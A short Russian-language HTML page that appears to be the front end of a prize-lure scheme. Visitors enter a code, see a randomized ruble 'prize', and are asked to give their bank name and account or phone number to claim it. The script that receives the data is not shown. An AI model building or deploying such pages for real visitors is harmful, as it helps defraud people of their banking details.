<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Проверка кода</title>
    <link rel="stylesheet" href="static/style.css" />
</head>
<body>
    <div class="container">
        <div id="codeForm">
            <input type="text" id="checkCode" placeholder="Введите проверочный код" />
            <button onclick="checkCode()">Продолжить</button>
        </div>
        <div id="result" style="display:none;">
            <div id="randomizer">0 ₽</div>
            <div id="prizeText"></div>
            <button id="claimBtn" style="display:none;" onclick="openModal()">Забрать приз</button>
        </div>
    </div>

    <div id="modal" class="modal hidden">
        <div class="modal-content">
            <input type="text" id="bank" placeholder="Название банка" />
            <input type="text" id="account" placeholder="Номер счёта / телефона" />
            <button onclick="sendDetails()">Отправить</button>
        </div>
    </div>

    <script src="static/script.js"></script>
</body>
</html>
